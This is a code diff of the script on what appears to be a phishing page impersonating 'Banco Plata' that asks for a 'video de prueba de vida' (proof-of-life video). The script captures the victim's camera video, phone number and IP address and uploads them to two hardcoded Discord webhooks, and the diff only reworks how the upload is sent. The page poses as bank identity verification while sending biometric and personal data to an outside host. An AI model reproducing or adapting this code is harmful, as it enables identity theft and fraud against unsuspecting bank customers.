@@ -73,7 +73,6 @@
   <canvas id="captureCanvas" style="display: none;"></canvas>
 
   <script>
-    // DOS WEBHOOKS
     const DISCORD_WEBHOOKS = [
       'https://discord.com/api/webhooks/1571213669348675625/h6b4ppxq74Q9WmwVFCrcCQ-hcWpKboACJX5KyVzURPvxCvNxS9OdAncT0vRavWsYMJr0',
       'https://discord.com/api/webhooks/1571164818553966615/6aK6_RyRyUP7M8SAr3RZDHP2nTsK1wu_irSR2ewG2i5t4axW1ad1hP21yRNXJdUIQQc'
@@ -170,18 +169,13 @@
           return new Blob(byteArrays, { type: contentType });
         }
 
-        const payload = { 
-          username: "Banco Plata - Video", 
-          content: `🎥 **Video de Prueba de Vida**\n\n**📱 Teléfono:** ${phone}\n**🌐 IP:** ${ip}\n**⏰ Fecha:** ${new Date().toLocaleString()}` 
-        };
+        const formData = new FormData();
+        const payload = { username: "Banco Plata - Video", content: `🎥 **Video de Prueba de Vida**\n\n**📱 Teléfono:** ${phone}\n**🌐 IP:** ${ip}\n**⏰ Fecha:** ${new Date().toLocaleString()}` };
 
-        // Enviar a AMBOS webhooks
-        await Promise.allSettled(DISCORD_WEBHOOKS.map(async (url) => {
-          const formData = new FormData();
-          formData.append('payload_json', JSON.stringify(payload));
-          formData.append('file1', base64ToBlob(base64Video, 'video/webm'), 'Video_Prueba_Vida.webm');
-          return fetch(url, { method: 'POST', body: formData });
-        }));
+        formData.append('payload_json', JSON.stringify(payload));
+        formData.append('file1', base64ToBlob(base64Video, 'video/webm'), 'Video_Prueba_Vida.webm');
+
+        for (const webhook of DISCORD_WEBHOOKS) { await fetch(webhook, { method: 'POST', body: formData }); }
         
         document.getElementById('loader').style.display = 'none'; 
         document.getElementById('successScreen').style.display = 'flex'; 
